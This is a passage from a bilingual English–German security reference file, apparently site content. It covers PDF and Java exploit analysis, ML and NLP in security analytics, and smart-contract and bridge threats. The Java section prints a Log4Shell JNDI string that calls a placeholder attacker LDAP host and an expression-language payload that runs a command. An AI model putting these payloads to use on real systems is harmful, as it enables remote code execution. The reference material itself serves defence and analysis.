  <li><strong>Deserialization gadget chains (still primary).</strong> <code>readObject</code> on attacker bytes + classpath containing gadget library (Commons Collections, Spring, Mozilla Rhino, Click). ysoserial generates the payload. JEP-290 filter rarely configured. See server-side-language-audits entry.</li>
  <li><strong>Expression-language injection.</strong> SpEL, OGNL, MVEL, Velocity. <code>\${T(Runtime).getRuntime().exec('id')}</code> patterns. Spring Framework CVE-2022-22965 (Spring4Shell) reachable via this surface.</li>
  <li><strong>Reflection misuse.</strong> Application accepts class names + method names from user input → instantiate arbitrary class. Often combined with deserialization to find gadgets dynamically.</li>
  <li><strong>JNDI lookup with attacker-controlled name (Log4Shell, CVE-2021-44228).</strong> <code>\${jndi:ldap://attacker/x}</code> resolved by Log4j → LDAP fetches Java class → loaded and instantiated → arbitrary RCE.</li>
</ul>

<h2>What each exploit tells you about the runtime</h2>
<ul>
  <li>Exploit success against specific gadget chain → classpath confirmed to include that library + JRE version below the patch.</li>
  <li>Log4Shell trigger → log4j-core 2.0–2.14.1 present.</li>
  <li>Spring4Shell trigger → Spring framework with vulnerable binding behavior + JDK ≥ 9.</li>
  <li>JNDI fetched but no class load → JNDI lookup enabled, JDK ≥ 8u191 disabling default LDAP class load. Still useful as DNS-callback proof.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>Document-borne exploits are mostly social-engineering wrappers around an underlying runtime vuln. The PDF/Office/JNLP is the carrier; the actual exploit is in the embedded JS / macro / serialized payload. Triage the carrier; analyze the cargo.</div>
`,
      `
<h2>PDF — Struktur</h2>
<ul>
  <li><strong>File-Layout.</strong> Header (<code>%PDF-1.x</code>), Body (nummerierte Objects), xref-Tabelle, Trailer mit Root-Object-Referenz. <code>peepdf</code> / <code>pdfid</code> / <code>pdf-parser</code> für strukturelle Analyse.</li>
  <li><strong>Interessante Object-Typen.</strong>
    <ul>
      <li><code>/JavaScript</code> + <code>/JS</code> — JS-Payload (das Offensichtliche).</li>
      <li><code>/EmbeddedFile</code> — angehängter Payload (Dropper).</li>
      <li><code>/OpenAction</code>, <code>/AA</code> — Auto-Trigger beim Öffnen.</li>
      <li><code>/Launch</code> — externe App starten (von modernen Viewern meist gekillt).</li>
      <li><code>/RichMedia</code> — eingebettetes Flash (historisch; noch in alten Samples).</li>
      <li><code>/SubmitForm</code> — Form an Angreifer-URL submitten.</li>
    </ul>
  </li>
  <li><strong>Verdächtige Indikatoren.</strong> Mismatch zwischen deklarierter Object-Anzahl und tatsächlicher; massive Object-Anzahl für "kleines" PDF; encoded Streams (<code>/Filter /FlateDecode /ASCIIHexDecode</code> verkettet).</li>
</ul>

<h2>PDF — Skript-Extraktion</h2>
<ol>
  <li><code>pdfid file.pdf</code> zeigt Counts verdächtiger Keywords.</li>
  <li><code>pdf-parser -f file.pdf</code> listet Objects mit gefiltertem Content.</li>
  <li>Object mit <code>/JS</code> oder <code>/JavaScript</code> finden — Content extrahieren.</li>
  <li>Mit <code>js-beautify</code> dekodieren; dann deobfuskieren (oft <code>app.alert(unescape("%u..."))</code>-Shellcode).</li>
  <li>Extrahiertes JS in sandboxed JS-Interpreter (<code>spidermonkey</code>) mit gestubbten PDF-spezifischen APIs laufen lassen, um dekodierten Payload zu sehen.</li>
</ol>

<h2>PDF — Viewer-Parser-Disagreements</h2>
<ul>
  <li><strong>Adobe Reader vs Foxit vs Browser-native.</strong> Jeder parsed xref-Corruption, multiple <code>startxref</code>-Einträge, Header im Body leicht anders. Angreifer craften Files, die ein Viewer ablehnt (von Sandbox genutzt) und ein anderer akzeptiert (vom Opfer genutzt).</li>
  <li><strong>Polyglot-Files.</strong> Valid PDF + valid ZIP + valid JPEG gleichzeitig. Verschiedene Konsumenten sehen verschiedenen Content.</li>
  <li><strong>Sig-Bypass via Incremental-Update.</strong> Original-PDF signiert; Angreifer hängt Incremental-Update an, das gerenderten Content ändert; Viewer zeigt aktualisierten Content mit grünem Signatur-Checkmark vom Original.</li>
</ul>

<h2>Java — historische Exploit-Muster</h2>
<ul>
  <li><strong>Applet-Sandbox-Escapes (2012–2014).</strong> CVE-2012-4681 (TrustedMethodChainsToTrue), CVE-2013-2423, CVE-2013-2465. Definierten die Ära; pushten Enterprises weg von Browser-side Java.</li>
  <li><strong>JNLP / Web Start.</strong> Java Web Start ließ unsignierte-aber-trusted Apps außerhalb der Sandbox laufen. Mehrfache Bypasses des Trust-Prompts.</li>
  <li><strong>Browser-Plugin-EOL.</strong> Moderne Browser laufen kein Java. Muster historisch für Forensik; nicht aktuell.</li>
</ul>

<h2>Java — aktuelle Muster</h2>
<ul>
  <li><strong>Deserialisierungs-Gadget-Chains (noch primär).</strong> <code>readObject</code> auf Angreifer-Bytes + Classpath enthält Gadget-Library (Commons Collections, Spring, Mozilla Rhino, Click). ysoserial generiert Payload. JEP-290-Filter selten konfiguriert. Siehe server-side-language-audits.</li>
  <li><strong>Expression-Language-Injection.</strong> SpEL, OGNL, MVEL, Velocity. <code>\${T(Runtime).getRuntime().exec('id')}</code>-Muster. Spring-Framework CVE-2022-22965 (Spring4Shell) über diese Oberfläche erreichbar.</li>
  <li><strong>Reflection-Missbrauch.</strong> App akzeptiert Class-Namen + Method-Namen aus User-Input → beliebige Klasse instantiieren. Oft mit Deserialisierung kombiniert, um Gadgets dynamisch zu finden.</li>
  <li><strong>JNDI-Lookup mit angreifer-kontrolliertem Namen (Log4Shell, CVE-2021-44228).</strong> <code>\${jndi:ldap://attacker/x}</code> von Log4j resolved → LDAP fetcht Java-Class → geladen und instantiiert → arbitrary RCE.</li>
</ul>

<h2>Was jeder Exploit über die Runtime verrät</h2>
<ul>
  <li>Exploit-Erfolg gegen spezifische Gadget-Chain → Classpath bestätigt enthält Library + JRE-Version unter dem Patch.</li>
  <li>Log4Shell-Trigger → log4j-core 2.0–2.14.1 vorhanden.</li>
  <li>Spring4Shell-Trigger → Spring-Framework mit verwundbarem Binding + JDK ≥ 9.</li>
  <li>JNDI gefetcht aber kein Class-Load → JNDI-Lookup enabled, JDK ≥ 8u191 default-disabled LDAP-Class-Load. Noch nützlich als DNS-Callback-Proof.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Document-borne Exploits sind meist Social-Engineering-Wrapper um eine zugrunde liegende Runtime-Vuln. PDF/Office/JNLP ist der Carrier; der eigentliche Exploit ist in der eingebetteten JS / Macro / serialized Payload. Carrier triagieren; Cargo analysieren.</div>
`
    ),
    phases: []
  },

  // ─────────────────────────────────────────────────────────────
  // 07 — AI, DATA & EMERGING RISK
  // ─────────────────────────────────────────────────────────────
  {
    id: "ml-and-analytics",
    domain: "ai-emerging", tier: 3,
    title: T("ML & Cyber Analytics", "ML & Cyber Analytics"),
    blurb: T(
      "Vendor-neutral landscape map: model families, training pipelines, deployment patterns — plus which statistical/ML models fit which security-analytics problems and where they reliably fail.",
      "Hersteller-neutrale Landschaftskarte: Modell-Familien, Training-Pipelines, Deployment-Muster — sowie welche statistischen/ML-Modelle zu welchen Security-Analytics-Problemen passen und wo sie zuverlässig scheitern."
    ),
    body: B(
      `
<h2>Model families</h2>
<ul>
  <li><strong>Linear (LR, Lasso, Ridge).</strong> Cheap, interpretable, baseline for any tabular task. Coefficients show which feature drives the score.</li>
  <li><strong>Tree-based (Random Forest, XGBoost, LightGBM, CatBoost).</strong> Dominant for tabular security data (alerts, log events). Handles missing values, mixed types, non-linear interactions. SHAP for per-prediction explanation.</li>
  <li><strong>Deep neural (MLP, CNN, RNN/LSTM).</strong> Good for sequences (network flows, process trees), images (icon-similarity for malware family), and raw bytes (deep-learning malware classifiers).</li>
  <li><strong>Transformer.</strong> State of the art for log understanding, code analysis, text-heavy security tasks. Expensive; often distilled or used for offline batch enrichment rather than real-time scoring.</li>
  <li><strong>Graph neural networks.</strong> Authentication graphs, lateral-movement graphs, malware-similarity graphs. Niche but growing.</li>
</ul>

<h2>Training pipelines</h2>
<ul>
  <li><strong>Offline batch.</strong> Daily/weekly retrain on accumulated labeled data. Lowest operational complexity. Standard for most security ML.</li>
  <li><strong>Online learning.</strong> Update on each new labeled example. Useful where labels arrive faster than batch cycle (real-time fraud). Beware label-quality drift poisoning the model.</li>
  <li><strong>Federated.</strong> Train across customer tenants without centralizing data. Compelling story for security vendors; significant engineering cost. Honest claim only if model improves measurably from federation versus per-tenant baseline.</li>
  <li><strong>Active learning.</strong> Model queries analyst for labels on uncertain examples. Maximizes labeling ROI when SOC time is the bottleneck.</li>
</ul>

<h2>Deployment patterns</h2>
<ul>
  <li><strong>In-product real-time.</strong> Score every event inline. Latency budget tight (&lt;10 ms typical). Model must be small + cached features pre-computed.</li>
  <li><strong>Sidecar / async.</strong> Event published to queue, scored async. Higher latency budget (seconds). Larger models possible.</li>
  <li><strong>Batch scoring.</strong> Periodic enrichment job over historical data. Largest models. Used for hunt and ranking, not for blocking.</li>
  <li><strong>Edge / on-device.</strong> Endpoint-side ML. Constrained model size. Examples: on-device URL classifier, on-device process-behavior classifier.</li>
</ul>

<h2>Analytics fit — what works and what fails</h2>
<ul>
  <li><strong>Anomaly detection.</strong> Works on stable baselines (user login patterns, network egress volume by host). Fails on adversarial drift: attacker observes baseline, stays inside it. Also fails on concept drift: baseline itself moves due to legitimate change (new application, holiday traffic) producing false positives.</li>
  <li><strong>Supervised classification.</strong> Works when labeled data is large + threat distribution stable + features extractable. Examples: domain-classification (DGA vs legit), URL phishing detection, malware family identification. Fails when novelty rate exceeds retraining cadence.</li>
  <li><strong>Clustering.</strong> Useful for triage (group similar alerts, surface representative example) and for exploration (cluster newly seen samples to find emerging family). Weak as primary decision surface: no ground truth = no measurable accuracy.</li>
  <li><strong>Ranking.</strong> Strong fit for SOC triage. Train on analyst dispositions (true positive / false positive) → rank new alerts by predicted disposition. Measurable in alert-to-resolution time reduction.</li>
  <li><strong>UEBA-style risk scoring.</strong> Combine multiple weak signals into composite risk. Useful as a hunt input. Often over-claimed as a detection.</li>
</ul>

<h2>Failure modes per technique</h2>
<ul>
  <li><strong>Data-quality dependency.</strong> Garbage labels → garbage model. Vendor "AI" trained on biased label set fails on your data.</li>
  <li><strong>FP/FN bias cost.</strong> Threshold choice is a business question, not a model question. Authentication: false-positive cost = user friction; false-negative cost = breach. Threshold drives behavior.</li>
  <li><strong>Model maintenance cost.</strong> 3-year deployment requires retraining cadence, feature-pipeline maintenance, drift monitoring, label-quality auditing. Most vendor demos ignore this.</li>
  <li><strong>Adversarial drift.</strong> Attackers test against deployed models. Detection-as-code rulesets (Sigma) and ML models both decay; neither is "set and forget."</li>
</ul>

<h2>Evaluating vendor ML claims</h2>
<ol>
  <li><strong>"What features?"</strong> Vendor unwilling to disclose = often the model is shallow.</li>
  <li><strong>"What's the FP rate on your data, on my data?"</strong> Customer-side measurement against a known representative window.</li>
  <li><strong>"How often retrained, on what data?"</strong> Federated claims = verify or discount.</li>
  <li><strong>"What's the explainability surface for an analyst?"</strong> SHAP, top-k feature contributions, or pure black box?</li>
  <li><strong>"What's the operational cost of a wrong decision and how is the loop closed?"</strong> Labeling feedback path or fire-and-forget?</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>ML in security earns its keep when it ranks and prioritizes analyst attention. It struggles when promoted to autonomous decision-maker on novel threats. The honest deployment shape is "model surfaces candidates, analyst decides, decisions feed back into training."</div>
`,
      `
<h2>Modell-Familien</h2>
<ul>
  <li><strong>Linear (LR, Lasso, Ridge).</strong> Günstig, interpretierbar, Baseline für jeden Tabular-Task. Koeffizienten zeigen, welches Feature den Score treibt.</li>
  <li><strong>Tree-basiert (Random Forest, XGBoost, LightGBM, CatBoost).</strong> Dominant für tabulare Security-Daten (Alerts, Log-Events). Handled Missing Values, gemischte Typen, nicht-lineare Interaktionen. SHAP für Per-Prediction-Erklärung.</li>
  <li><strong>Deep Neural (MLP, CNN, RNN/LSTM).</strong> Gut für Sequenzen (Network-Flows, Process-Trees), Bilder (Icon-Similarity für Malware-Familie) und Raw-Bytes (Deep-Learning-Malware-Klassifier).</li>
  <li><strong>Transformer.</strong> State of the Art für Log-Understanding, Code-Analyse, text-lastige Security-Tasks. Teuer; oft destilliert oder für Offline-Batch-Enrichment statt Real-Time-Scoring.</li>
  <li><strong>Graph Neural Networks.</strong> Authentication-Graphen, Lateral-Movement-Graphen, Malware-Similarity-Graphen. Nische, aber wachsend.</li>
</ul>

<h2>Training-Pipelines</h2>
<ul>
  <li><strong>Offline-Batch.</strong> Täglich/wöchentlich Retrain auf akkumulierten gelabelten Daten. Niedrigste operative Komplexität. Standard für meiste Security-ML.</li>
  <li><strong>Online-Learning.</strong> Update bei jedem neuen Label. Nützlich wo Labels schneller ankommen als Batch-Zyklus (Real-Time-Fraud). Vorsicht vor Label-Qualitäts-Drift, die Modell vergiftet.</li>
  <li><strong>Federated.</strong> Training über Customer-Tenants ohne Daten zu zentralisieren. Überzeugende Story für Security-Vendors; signifikanter Engineering-Aufwand. Ehrlicher Claim nur wenn Modell messbar von Federation gegenüber Per-Tenant-Baseline verbessert.</li>
  <li><strong>Active Learning.</strong> Modell befragt Analyst für Labels bei unsicheren Beispielen. Maximiert Labeling-ROI wenn SOC-Zeit Bottleneck ist.</li>
</ul>

<h2>Deployment-Muster</h2>
<ul>
  <li><strong>In-Produkt-Real-Time.</strong> Jedes Event inline scoren. Latency-Budget eng (&lt;10 ms typisch). Modell muss klein sein + Cached-Features vorberechnet.</li>
  <li><strong>Sidecar / Async.</strong> Event in Queue, async gescort. Höheres Latency-Budget (Sekunden). Größere Modelle möglich.</li>
  <li><strong>Batch-Scoring.</strong> Periodischer Enrichment-Job über historische Daten. Größte Modelle. Genutzt für Hunt und Ranking, nicht für Blocking.</li>
  <li><strong>Edge / On-Device.</strong> Endpoint-seitige ML. Begrenzte Modell-Größe. Beispiele: On-Device-URL-Klassifier, On-Device-Process-Behavior-Klassifier.</li>
</ul>

<h2>Analytics-Fit — was funktioniert und was scheitert</h2>
<ul>
  <li><strong>Anomalie-Detektion.</strong> Funktioniert auf stabilen Baselines (User-Login-Muster, Network-Egress-Volume pro Host). Scheitert an adversarialem Drift: Angreifer beobachtet Baseline, bleibt drin. Auch Concept-Drift: Baseline selbst bewegt sich durch legitimen Change (neue App, Feiertags-Traffic) und produziert False-Positives.</li>
  <li><strong>Supervised Klassifikation.</strong> Funktioniert bei großem Label-Datensatz + stabiler Threat-Verteilung + extrahierbaren Features. Beispiele: Domain-Klassifikation (DGA vs legit), URL-Phishing-Detektion, Malware-Familie. Scheitert wenn Novelty-Rate Retraining-Kadenz übersteigt.</li>
  <li><strong>Clustering.</strong> Nützlich für Triage (ähnliche Alerts gruppieren, repräsentatives Beispiel) und Exploration (neu gesehene Samples clustern um emergierende Familie zu finden). Schwach als primäre Entscheidungsfläche: keine Ground-Truth = keine messbare Accuracy.</li>
  <li><strong>Ranking.</strong> Starker Fit für SOC-Triage. Auf Analyst-Dispositions (True-Positive / False-Positive) trainieren → neue Alerts nach predicted Disposition ranken. Messbar in Alert-to-Resolution-Time-Reduktion.</li>
  <li><strong>UEBA-style Risk-Scoring.</strong> Mehrere schwache Signale zu Composite-Risk kombinieren. Nützlich als Hunt-Input. Oft als Detektion überklaimed.</li>
</ul>

<h2>Fehlermodi pro Technik</h2>
<ul>
  <li><strong>Daten-Qualitäts-Abhängigkeit.</strong> Garbage Labels → Garbage Model. Vendor-"AI" auf biased Label-Set trainiert scheitert auf deinen Daten.</li>
  <li><strong>FP/FN-Bias-Kosten.</strong> Threshold-Choice ist Business-Frage, keine Modell-Frage. Auth: FP-Kosten = User-Friction; FN-Kosten = Breach.</li>
  <li><strong>Modell-Wartungskosten.</strong> 3-Jahre-Deployment erfordert Retraining-Kadenz, Feature-Pipeline-Wartung, Drift-Monitoring, Label-Quality-Auditing. Meiste Vendor-Demos ignorieren das.</li>
  <li><strong>Adversarialer Drift.</strong> Angreifer testen gegen deployte Modelle. Detection-as-Code-Rulesets (Sigma) und ML-Modelle verfallen beide; weder "set and forget".</li>
</ul>

<h2>Vendor-ML-Claims evaluieren</h2>
<ol>
  <li><strong>"Welche Features?"</strong> Vendor will nicht disclosen = Modell oft shallow.</li>
  <li><strong>"FP-Rate auf euren Daten, auf meinen Daten?"</strong> Customer-seitige Messung gegen bekanntes repräsentatives Fenster.</li>
  <li><strong>"Wie oft retrained, auf welchen Daten?"</strong> Federated-Claims = verifizieren oder discounten.</li>
  <li><strong>"Welche Explainability-Oberfläche für Analyst?"</strong> SHAP, Top-k-Feature-Contributions oder pure Black-Box?</li>
  <li><strong>"Operative Kosten einer falschen Entscheidung und wie wird Schleife geschlossen?"</strong> Labeling-Feedback-Pfad oder Fire-and-Forget?</li>
</ol>
<div class="rs-rule"><strong>Faustregel</strong>ML in Security rentiert sich, wenn es Analyst-Aufmerksamkeit ranked und priorisiert. Kämpft, wenn zum autonomen Entscheider für novel Threats befördert. Ehrliche Deployment-Form ist "Modell oberflächt Kandidaten, Analyst entscheidet, Entscheidungen flow back ins Training".</div>
`
    ),
    phases: ["cves"]
  },
  {
    id: "nlp-in-security",
    domain: "ai-emerging", tier: 3,
    title: T("NLP in Security — Reference", "NLP in Security — Referenz"),
    blurb: T(
      "Natural-language processing applied to security work: log clustering, phishing detection, report summarization, and where modern LLM-driven techniques fit (and don't).",
      "Natural Language Processing für Sicherheits-Arbeit: Log-Clustering, Phishing-Detektion, Report-Zusammenfassung und wo moderne LLM-getriebene Techniken passen (und nicht)."
    ),
    body: B(
      `
<h2>Log clustering</h2>
<ul>
  <li><strong>Tokenization first.</strong> Replace numbers, IPs, UUIDs, paths with placeholders before vectorizing. Otherwise every line is unique.</li>
  <li><strong>TF-IDF + cosine.</strong> Cheap baseline. Works for medium-cardinality log corpora. Tune <code>min_df</code> / <code>max_df</code> to prevent rare tokens dominating.</li>
  <li><strong>Drain / Spell algorithms.</strong> Template-extraction algorithms designed for logs. Output is a tree of templates with placeholders; each new log line is assigned to a template. Best ROI for unstructured operational logs.</li>
  <li><strong>Embedding-based (sentence-transformers, BGE).</strong> Higher semantic quality, more compute. Worth it for English-language security text (alerts, ticket bodies) where tokens vary while meaning repeats.</li>
  <li><strong>Granularity knob.</strong> Tighter clusters = more clusters = less load reduction per cluster. Looser clusters = fewer clusters = larger but more heterogeneous. Calibrate per consumer: analyst wants ~50–200 clusters per day per source.</li>
</ul>

<h2>Phishing detection</h2>
<ul>
  <li><strong>Stable linguistic features.</strong>
    <ul>
      <li>Urgency lexicon: "immediately", "within 24 hours", "your account will be suspended".</li>
      <li>Brand-impersonation cues: brand name + generic greeting + non-brand reply-to.</li>
      <li>URL constructions: subdomain padding (<code>microsoft.com.malicious.io</code>), homoglyphs (Cyrillic а for Latin a), URL shorteners obscuring destination.</li>
    </ul>
  </li>
  <li><strong>Image-embedded text problem.</strong> Modern campaigns ship body as a single image (no text features for classifier). Counter: OCR pipeline before NLP. <code>tesseract</code> or hosted Vision API → text → classifier.</li>
  <li><strong>Multimodal classifier.</strong> Train on (rendered-screenshot, headers, body-text) tuple. Visual similarity to known brand login page is a stronger feature than any text feature alone.</li>
  <li><strong>Evaluation gotcha.</strong> Holdout must be temporally separated from training. Phishing distribution drifts weekly; in-time evaluation overstates production performance.</li>
</ul>

<h2>Report summarization with LLMs</h2>
<ul>
  <li><strong>What LLMs do well on security text.</strong>
    <ul>
      <li>Factual extraction: pull IOCs, CVEs, dates from prose.</li>
      <li>Cross-format normalization: convert vendor-specific advisory wording to internal schema.</li>
      <li>Draft generation: first-pass summary, ticket body, advisory paragraph — analyst edits.</li>
    </ul>
  </li>
  <li><strong>Unreliable at.</strong>
    <ul>
      <li>Confidence calibration: LLM equally confident about correct and incorrect claims.</li>
      <li>Novelty detection: trained on past data, weakly distinguishes "new" from "looks like past".</li>
      <li>Attribution: hallucinates actor attribution if asked for a specific actor.</li>
    </ul>
  </li>
  <li><strong>Honest deployment.</strong> LLM as drafter, analyst as approver. Logged feedback (accepted, edited, rejected) feeds prompt and model refinement.</li>
</ul>

<h2>Prompt patterns for security LLMs</h2>
<ul>
  <li><strong>Cite-or-decline.</strong> "Cite source IDs from the provided documents for every claim. If no source supports the claim, say 'no source'." Reduces hallucination materially.</li>
  <li><strong>Structured output.</strong> JSON schema with named fields. Easier to validate downstream than free-form prose.</li>
  <li><strong>Two-pass.</strong> First pass extracts; second pass evaluates whether the extraction is correct. Catches obvious errors.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For pre-LLM NLP, the right tool is usually Drain (logs) or sentence-transformers (security text). For LLM-driven work, give the model documents to ground on and require citation — most of the value of an LLM in a security pipeline is structured extraction with a verifiable trail, not freeform analysis.</div>
`,
      `
<h2>Log-Clustering</h2>
<ul>
  <li><strong>Tokenisierung zuerst.</strong> Zahlen, IPs, UUIDs, Pfade durch Platzhalter ersetzen vor Vektorisierung. Sonst ist jede Zeile einzigartig.</li>
  <li><strong>TF-IDF + Cosine.</strong> Günstige Baseline. Funktioniert für Medium-Cardinality-Log-Corpora. <code>min_df</code> / <code>max_df</code> tunen, damit seltene Tokens nicht dominieren.</li>
  <li><strong>Drain / Spell-Algorithmen.</strong> Template-Extraktions-Algorithmen für Logs. Output ist Baum von Templates mit Platzhaltern; jede neue Log-Zeile wird einem Template zugewiesen. Beste ROI für unstrukturierte operative Logs.</li>
  <li><strong>Embedding-basiert (sentence-transformers, BGE).</strong> Höhere semantische Qualität, mehr Compute. Lohnt sich für englischsprachigen Security-Text (Alerts, Ticket-Bodies), wo Tokens variieren während Bedeutung sich wiederholt.</li>
  <li><strong>Granularitäts-Knob.</strong> Engere Cluster = mehr Cluster = weniger Last-Reduktion pro Cluster. Lockerer = weniger, aber heterogener. Pro Konsument kalibrieren: Analyst will ~50–200 Cluster pro Tag pro Source.</li>
</ul>

<h2>Phishing-Detektion</h2>
<ul>
  <li><strong>Stabile linguistische Features.</strong>
    <ul>
      <li>Dringlichkeits-Lexikon: "sofort", "innerhalb 24 Stunden", "Ihr Account wird gesperrt".</li>
      <li>Brand-Impersonation-Cues: Brand-Name + generische Anrede + Nicht-Brand-Reply-To.</li>
      <li>URL-Konstruktionen: Subdomain-Padding (<code>microsoft.com.malicious.io</code>), Homoglyphen (Kyrillisches а für lateinisches a), URL-Shortener, die Destination verbergen.</li>
    </ul>
  </li>
  <li><strong>Image-Embedded-Text-Problem.</strong> Moderne Kampagnen versenden Body als einzelnes Bild (keine Text-Features für Klassifier). Counter: OCR-Pipeline vor NLP. <code>tesseract</code> oder hosted Vision-API → Text → Klassifier.</li>
  <li><strong>Multimodaler Klassifier.</strong> Auf (gerendertem Screenshot, Header, Body-Text)-Tupel trainieren. Visuelle Ähnlichkeit zu bekannter Brand-Login-Page ist stärkeres Feature als jedes Text-Feature allein.</li>
  <li><strong>Evaluations-Falle.</strong> Holdout muss temporal vom Training getrennt sein. Phishing-Verteilung driftet wöchentlich; In-Time-Evaluation überzeichnet Produktions-Performance.</li>
</ul>

<h2>Report-Zusammenfassung mit LLMs</h2>
<ul>
  <li><strong>Was LLMs auf Security-Text gut können.</strong>
    <ul>
      <li>Faktenextraktion: IOCs, CVEs, Daten aus Prosa ziehen.</li>
      <li>Cross-Format-Normalisierung: Vendor-spezifischen Advisory-Wortlaut in internes Schema umwandeln.</li>
      <li>Draft-Generierung: First-Pass-Summary, Ticket-Body, Advisory-Absatz — Analyst editiert.</li>
    </ul>
  </li>
  <li><strong>Unzuverlässig bei.</strong>
    <ul>
      <li>Konfidenz-Kalibrierung: LLM gleich zuversichtlich bei richtigen und falschen Claims.</li>
      <li>Novelty-Detektion: auf Vergangenheitsdaten trainiert, unterscheidet "neu" schwach von "sieht wie Vergangenheit aus".</li>
      <li>Attribution: halluziniert Actor-Attribution wenn nach spezifischem Actor gefragt.</li>
    </ul>
  </li>
  <li><strong>Ehrliche Deployment.</strong> LLM als Drafter, Analyst als Approver. Geloggtes Feedback (akzeptiert, editiert, abgelehnt) füttert Prompt- und Modell-Verfeinerung.</li>
</ul>

<h2>Prompt-Muster für Security-LLMs</h2>
<ul>
  <li><strong>Cite-or-Decline.</strong> "Source-IDs aus bereitgestellten Dokumenten für jeden Claim zitieren. Wenn keine Source einen Claim stützt, 'keine Source' sagen." Reduziert Halluzination materiell.</li>
  <li><strong>Strukturierter Output.</strong> JSON-Schema mit benannten Feldern. Einfacher downstream zu validieren als freie Prosa.</li>
  <li><strong>Two-Pass.</strong> Erster Pass extrahiert; zweiter Pass evaluiert, ob die Extraktion korrekt ist. Fängt offensichtliche Fehler.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für Pre-LLM-NLP ist das richtige Tool meist Drain (Logs) oder sentence-transformers (Security-Text). Für LLM-getriebene Arbeit dem Modell Dokumente zum Grounding geben und Zitation verlangen — der meiste Wert eines LLMs in einer Security-Pipeline ist strukturierte Extraktion mit verifizierbarem Trail, nicht freiform Analyse.</div>
`
    ),
    phases: []
  },
  {
    id: "blockchain-security-reference",
    domain: "ai-emerging", tier: 3,
    title: T("Blockchain Security — Reference", "Blockchain Security — Referenz"),
    blurb: T(
      "Smart-contract, bridge, and consensus-layer threat classes — where the field's actual losses cluster, and the audit patterns that catch them.",
      "Bedrohungsklassen für Smart Contracts, Bridges und Konsens-Layer — wo die tatsächlichen Verluste der Branche kumulieren, und die Audit-Muster, die sie fangen."
    ),
    body: B(
      `
<h2>Smart-contract threat classes</h2>
<ul>
  <li><strong>Reentrancy.</strong> External call before state update lets callee call back into the contract in a state where invariants don't hold. Audit pattern: every external call (<code>.call</code>, ERC-20 transfer to unknown address, <code>safeTransferFrom</code> with hooks) followed by state mutation = reentrancy candidate. Mitigation: checks-effects-interactions ordering, reentrancy-guard modifier, pull-payment over push.</li>
  <li><strong>Integer overflow/underflow.</strong> Solidity ≥0.8 reverts on overflow; pre-0.8 used SafeMath. Audit pattern: explicit <code>unchecked { … }</code> blocks must be reviewed. Common bug: <code>unchecked</code> used for gas savings in subtraction without bounds check.</li>
  <li><strong>Access control.</strong> Missing <code>onlyOwner</code> on privileged function; <code>tx.origin</code> for auth (bypassable via intermediate contract); initializer callable twice; role-renounce paths that brick the contract.</li>
  <li><strong>Oracle manipulation.</strong> Price feed = on-chain DEX spot price. Attacker flash-loans, swaps to move price, calls liquidation. Mitigation: TWAP over &gt;30 minutes; Chainlink-style off-chain aggregation; circuit breakers on price-delta.</li>
  <li><strong>Time-dependence.</strong> <code>block.timestamp</code> miner-manipulable by ~15 sec. Don't use for randomness, narrow window comparisons.</li>
  <li><strong>Gas DoS.</strong> Unbounded loop over user-controlled array; <code>send</code> to address that consumes more gas than 2300. Mitigation: paginate iteration; pull pattern.</li>
  <li><strong>Front-running / MEV.</strong> Mempool-visible transactions copied with higher gas to extract value. Mitigation: commit-reveal, private mempool (Flashbots), batch auctions.</li>
  <li><strong>Signature replay.</strong> EIP-712 signature missing chainId or nonce → replayable across chain or session.</li>
</ul>

<h2>Bridge architecture — where the losses live</h2>
<ul>
  <li><strong>Validator-set integrity.</strong> Bridge security == validator set. Ronin (2022, $625M) compromised 5/9 validator keys. Wormhole (2022, $326M) — signature-verification bypass. Audit: how is the validator set rotated? key custody (HSM, threshold)? slashing on misbehavior?</li>
  <li><strong>Message replay.</strong> Withdrawal proof reusable across chains or twice on same chain. Nomad (2022, $190M) — uninitialized trusted root, every message valid by default.</li>
  <li><strong>Asset accounting reconciliation.</strong> Locked on chain A, minted on chain B. Drift = solvency bug. Audit: invariant that <code>locked == minted</code> at any block. Off-chain monitor that fires on drift.</li>
  <li><strong>Upgradeability.</strong> Proxy upgrades by admin = unilateral rug risk. Audit: timelock + multisig + on-chain visibility. Compare upgrade governance against actual TVL — TVL grows faster than governance maturity in nearly all projects.</li>
</ul>

<h2>Consensus-layer threats</h2>
<ul>
  <li><strong>Long-range attack (PoS).</strong> Attacker buys old validator keys (worthless after they unstake), rewrites history from epoch where they had stake. Mitigation: weak subjectivity checkpoints.</li>
  <li><strong>Nothing-at-stake.</strong> Validator votes on every fork because no cost. Mitigation: slashing on conflicting votes.</li>
  <li><strong>MEV at consensus.</strong> Proposer-builder separation (PBS) tries to limit proposer rents; censorship and inclusion-list debates ongoing.</li>
  <li><strong>51% attack on PoW.</strong> Rent enough hash → reorg → double-spend. Economically rational on small chains; Bitcoin-Gold, Ethereum-Classic real-world examples.</li>
</ul>

<h2>Audit-pattern checklist</h2>
<ol>
  <li>External calls + state mutations — reentrancy review.</li>
  <li><code>unchecked</code> blocks — arithmetic review.</li>
  <li>Every privileged function — access-control review (who can call, can be revoked, can be transferred).</li>
  <li>Price-input source — TWAP or single-block? Manipulable via flash loan?</li>
  <li>Loops — bounded by constant or by user input?</li>
  <li>Upgrade path — admin, timelock, multisig configuration?</li>
  <li>Signature verification — chainId, nonce, EIP-712 structure correct?</li>
  <li>Initialization — initializer one-shot? Constructor sets all state? Proxy implementation initialized?</li>
</ol>
<div class="rs-rule"><strong>Rule of thumb</strong>In smart-contract audits the most expensive bugs are not exotic — they're access control, oracle manipulation, and upgrade-path mistakes. Spend 70% of audit time on the boring questions: who can call this, what does it trust, and what happens on the unhappy path.</div>
`,
      `
<h2>Smart-Contract-Bedrohungsklassen</h2>
<ul>
  <li><strong>Reentrancy.</strong> External Call vor State-Update lässt Callee in den Contract zurückrufen in einem Zustand, in dem Invarianten nicht halten. Audit-Muster: jeder External Call (<code>.call</code>, ERC-20-Transfer an unbekannte Adresse, <code>safeTransferFrom</code> mit Hooks) gefolgt von State-Mutation = Reentrancy-Kandidat. Mitigation: Checks-Effects-Interactions-Ordering, Reentrancy-Guard-Modifier, Pull-Payment statt Push.</li>
